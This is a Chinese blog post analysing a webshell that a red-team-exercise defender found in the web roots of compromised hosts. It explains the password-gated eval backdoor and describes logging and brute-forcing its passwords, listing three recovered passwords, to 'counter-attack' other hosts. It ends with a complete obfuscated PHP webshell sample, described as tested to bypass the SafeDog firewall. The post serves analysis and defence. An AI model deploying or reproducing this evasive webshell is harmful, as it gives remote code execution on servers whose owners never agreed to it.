---
layout: post
author: Vulkey_Chen
title: "对某攻击队的Webshell进行分析"
date: 2019-08-21
music-id: 
permalink: /archives/2019-08-21/1
description: "对某攻击队的Webshell进行分析"
---

对我⽅已拿下的攻击方⾁鸡进⾏⽇志、⽂件等分析，发现⼤部分肉鸡的网站根目录都存在 images.php，提取该文件的内容并分析：

![img](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2019-08-21/image020.png)

提出较为重要的那一段base64decode后的PHP代码进行分析：

```php
@session_start();//开启session

if(isset($_POST['code']))substr(sha1(md5($_POST['a'])),36)=='222f'&&$_SESSION['theCode']=$_POST['code'];if(isset($_SESSION['theCode']))@eval(base64_decode($_SESSION['theCode']));
```

**代码逻辑**：判断POST请求参数code是否有值，当满足条件时则执行`substr(sha1(md5($_POST['a'])),36)=='222f'&&$_SESSION['theCode']=$_POST['code']`，这段代码的意思为将POST请求参数a的值进行md5加密再进行sha1加密，最后从加密后的字符串的第36位开始取值（sha1加密后的值为40位，这里也就是取后4位），当后四位等于`222f`的时候条件为真则执行`$_SESSION['theCode']=$_POST['code']`（Why？**&&是逻辑与操作，如果&&的前面为false了，后面的就不会执行了，所以在这里也就间接的形成了一种判断从而必须满足后四位等于222f的条件**），最后进入该代码执行：`if(isset($_SESSION['theCode']))@eval(base64_decode($_SESSION['theCode']));`，代码如此简单就不再重复描述～

为了满足条件（`substr(sha1(md5($_POST['a'])),36)=='222f'`），我们可以采用钓鱼的方式等攻击方人员主动上钩（修改`images.php`即可）：

![img](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2019-08-21/image021.png)

当攻击方人员主动连接该Webshell时会将POST请求参数a的值写入到`pass.txt`中。

但此方法较为被动，我们还可以在本地搭建一个环境搭配Burp去爆破获取后四位为`222f`的明文：

![img](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2019-08-21/image022.png)

![img](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2019-08-21/image023.png)

获得了：`abc123000`、`lipeng520`、`160376`这三个密码，可利用密码对其他的肉鸡再次进行反打。

**代码样本**：（测试可过安全狗）

```php
<?php

$CF='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';

$EB=@$CF('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');

$EB('QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicmJiRfU0VTU0lPTlsndGhlQ29kZSddPSRfUE9TVFsnY29kZSddO2lmKGlzc2V0KCRfU0VTU0lPTlsndGhlQ29kZSddKSlAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7');

?>
```
